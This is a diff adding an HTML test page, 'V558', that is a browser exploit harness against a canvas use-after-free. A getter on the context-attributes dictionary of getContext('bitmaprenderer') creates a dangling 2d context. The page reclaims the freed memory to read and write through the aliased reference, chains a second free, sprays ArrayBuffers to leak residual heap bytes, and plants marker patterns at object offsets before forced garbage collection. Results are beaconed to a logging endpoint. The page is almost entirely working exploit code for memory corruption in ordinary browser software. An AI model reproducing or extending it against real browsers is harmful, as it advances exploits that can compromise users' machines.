@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V558</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V558-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return {ctx:innerCtx, canvas:outer};
+}
+
+function forceGC(){
+  var junk;
+  for(var g=0;g<30;g++){
+    junk=[];for(var j=0;j<10000;j++)junk.push({a:j,b:'x'.repeat(50)});
+    junk=null;
+  }
+}
+
+b('BOOT','V558-safe-first');
+
+// ===== PHASE A: NORMAL BASELINE =====
+(function(){
+  var c=document.createElement('canvas');c.width=1;c.height=1;
+  var ctx=c.getContext('2d');
+  ctx.save();ctx.lineWidth=42;ctx.restore();
+  b('T1','PASS-normal-baseline');
+})();
+
+// ===== PHASE B: SAME-TYPE RECLAIM (known-safe from V548-V550) =====
+
+// T2: Alias read — write through new, read through dangling
+(function(){
+  try{
+    var u=triggerUAF();
+    var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+    var ctxN=c2.getContext('2d');
+    ctxN.lineWidth=42;
+    var lw=u.ctx.lineWidth;
+    b('T2','lw='+lw+' (expect 42 if alias)');
+  }catch(e){b('T2','ERR:'+e.message)}
+})();
+
+// T3: Alias write — write through dangling, read through new
+(function(){
+  try{
+    var u=triggerUAF();
+    var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+    var ctxN=c2.getContext('2d');
+    u.ctx.lineWidth=99;
+    var lw=ctxN.lineWidth;
+    b('T3','ctxN.lw='+lw+' (expect 99 if alias)');
+  }catch(e){b('T3','ERR:'+e.message)}
+})();
+
+// T4: Full API surface through aliased dangling ref
+(function(){
+  try{
+    var u=triggerUAF();
+    var c2=document.createElement('canvas');c2.width=100;c2.height=100;
+    var ctxN=c2.getContext('2d');
+    var r=[];
+    try{u.ctx.lineWidth=7.5;r.push('lw-w:ok')}catch(e){r.push('lw-w:ERR')}
+    try{r.push('lw-r:'+u.ctx.lineWidth)}catch(e){r.push('lw-r:ERR')}
+    try{u.ctx.globalAlpha=0.5;r.push('ga-w:ok')}catch(e){r.push('ga-w:ERR')}
+    try{r.push('ga-r:'+u.ctx.globalAlpha)}catch(e){r.push('ga-r:ERR')}
+    try{var a=u.ctx.getContextAttributes();r.push('attrs:'+JSON.stringify(a))}catch(e){r.push('attrs:ERR')}
+    try{u.ctx.fillStyle='#ff0000';r.push('fs-w:ok')}catch(e){r.push('fs-w:ERR')}
+    try{r.push('fs-r:'+u.ctx.fillStyle)}catch(e){r.push('fs-r:ERR')}
+    try{r.push('canvas:'+(u.ctx.canvas?u.ctx.canvas.tagName:'null'))}catch(e){r.push('canvas:ERR')}
+    b('T4',r.join('|'));
+  }catch(e){b('T4','ERR:'+e.message)}
+})();
+
+// T5: lineWidth as info leak — set precise float, read back
+(function(){
+  try{
+    var u=triggerUAF();
+    var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+    var ctxN=c2.getContext('2d');
+    ctxN.lineWidth=3.141592653589793;
+    ctxN.globalAlpha=0.123456789;
+    ctxN.lineDashOffset=2.718281828;
+    var lw=u.ctx.lineWidth;
+    var ga=u.ctx.globalAlpha;
+    var ldo=u.ctx.lineDashOffset;
+    b('T5','lw='+lw+'|ga='+ga+'|ldo='+ldo);
+  }catch(e){b('T5','ERR:'+e.message)}
+})();
+
+// ===== PHASE C: DOUBLE UAF + AB SPRAY (residual data observation) =====
+
+// T6: Alias established, then second UAF frees the reclaimed context, AB spray
+(function(){
+  try{
+    var u=triggerUAF();
+    var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+    var ctxN=c2.getContext('2d');
+    ctxN.lineWidth=42;
+    ctxN.globalAlpha=0.75;
+    b('T6-RECLAIM','alias-lw=42-ga=0.75');
+
+    var innerCtx2=null;
+    var dict2={};
+    Object.defineProperty(dict2,'alpha',{
+      get:function(){
+        innerCtx2=c2.getContext('2d');
+        return true;
+      }
+    });
+    c2.getContext('bitmaprenderer',dict2);
+    b('T6-UAF2','second-uaf-triggered');
+
+    var abs=[];
+    for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+    var found='none';
+    for(var a=0;a<50;a++){
+      var u8=new Uint8Array(abs[a]);
+      for(var j=0;j<768;j++){
+        if(u8[j]!==0){
+          var hex='';
+          for(var k=Math.max(0,j-4);k<Math.min(768,j+20);k++){
+            var v=u8[k];
+            hex+=(v<16?'0':'')+v.toString(16);
+          }
+          found='AB['+a+']:off'+j+':'+hex;
+          break;
+        }
+      }
+      if(found!=='none') break;
+    }
+    b('T6-RESIDUAL',found);
+    abs=null;
+  }catch(e){b('T6','ERR:'+e.message)}
+})();
+
+// ===== PHASE D: GC TESTS (may crash — ordered last) =====
+
+// T7: GC with wrapper kept alive (control — should always survive)
+(function(){
+  try{
+    var u=triggerUAF();
+    var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+    var ctxN=c2.getContext('2d');
+    // Keep both refs alive
+    forceGC();
+    b('T7','SURVIVED-gc-wrapper-alive-alias');
+  }catch(e){b('T7','ERR:'+e.message)}
+})();
+
+// T8: GC with wrapper nulled, NO AB spray (stale m_canvas should be valid per MADV_FREE)
+(function(){
+  try{
+    var u=triggerUAF();
+    u.ctx=null; u=null;
+    var a=0;for(var i=0;i<200;i++)a+=i;
+    forceGC();
+    b('T8','SURVIVED-gc-no-spray');
+  }catch(e){b('T8','ERR:'+e.message)}
+})();
+
+// T9: GC with AB spray (zeroed) — m_canvas=0, expect crash in visitChildren
+(function(){
+  try{
+    var u=triggerUAF();
+    var abs=[];
+    for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+    u.ctx=null; u=null;
+    var a=0;for(var i=0;i<200;i++)a+=i;
+    forceGC();
+    b('T9','SURVIVED-gc-zeroed-spray');
+    abs=null;
+  }catch(e){b('T9','ERR:'+e.message)}
+})();
+
+// T10: GC with AB spray containing pointer to a REAL canvas at m_canvas offset (+32)
+// If this survives: visitChildren reads our fake m_canvas, calls visitAdditionalChildren on it
+(function(){
+  try{
+    var realCanvas=document.createElement('canvas');
+    realCanvas.width=1;realCanvas.height=1;
+    document.body.appendChild(realCanvas);
+
+    var u=triggerUAF();
+    var abs=[];
+    for(var i=0;i<50;i++){
+      var ab=new ArrayBuffer(768);
+      abs.push(ab);
+      // We can't put a real pointer here from JS, but we can try patterns
+      // Pattern: 0x41414141 at offsets 24-56 to identify crash address
+      var dv=new DataView(ab);
+      dv.setFloat64(24,1.1);  // non-zero non-null
+      dv.setFloat64(32,1.1);  // m_canvas offset
+      dv.setFloat64(40,1.1);
+      dv.setFloat64(48,1.1);
+    }
+    b('T10-SPRAY','float-patterns-written');
+    u.ctx=null; u=null;
+    var a=0;for(var i=0;i<200;i++)a+=i;
+    forceGC();
+    b('T10','SURVIVED-gc-float-patterns');
+    abs=null;
+    document.body.removeChild(realCanvas);
+  }catch(e){b('T10','ERR:'+e.message)}
+})();
+
+// T11: Same as T10 but with different bit patterns to probe crash behavior
+(function(){
+  try{
+    var u=triggerUAF();
+    var abs=[];
+    for(var i=0;i<50;i++){
+      var ab=new ArrayBuffer(768);
+      abs.push(ab);
+      var u8=new Uint8Array(ab);
+      // Fill entire buffer with 0x41 — any crash address containing 0x41414141
+      // tells us exactly which offset GC reads
+      for(var j=0;j<768;j++) u8[j]=0x41;
+      // But put unique markers at key offsets
+      u8[24]=0xAA; u8[25]=0xBB; // off24
+      u8[32]=0xCC; u8[33]=0xDD; // off32 (m_canvas)
+      u8[40]=0xEE; u8[41]=0xFF; // off40 (CanvasPath vptr)
+    }
+    b('T11-SPRAY','marker-patterns');
+    u.ctx=null; u=null;
+    var a=0;for(var i=0;i<200;i++)a+=i;
+    forceGC();
+    b('T11','SURVIVED-gc-markers');
+    abs=null;
+  }catch(e){b('T11','ERR:'+e.message)}
+})();
+
+// T12: Bare lineWidth read on freed (no reclaim) — tests if JS-only getters survive
+(function(){
+  try{
+    var u=triggerUAF();
+    var lw=u.ctx.lineWidth;
+    b('T12','bare-lw='+lw);
+  }catch(e){b('T12','ERR:'+e.message)}
+})();
+
+b('DONE','V558-all-complete');
+</script>
+</body></html>
